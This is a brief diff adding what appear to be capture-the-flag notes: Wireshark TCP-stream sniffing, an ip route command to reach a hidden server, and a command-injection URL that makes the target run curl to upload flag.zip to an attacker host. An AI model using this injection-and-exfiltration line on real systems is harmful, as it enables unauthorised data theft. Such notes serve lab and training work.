@@ -1,0 +1,5 @@
+wireshark - http traffic sniffing by following tcp stream
+
+locate secret server via ip route add <ip&CIDR of other machine> via <your ip>
+
+data exfil via custom python script and curl browser file acquisition http://<hostname>:8000?cmd=curl+<ip of atking device>+--upload-file+flag.zip
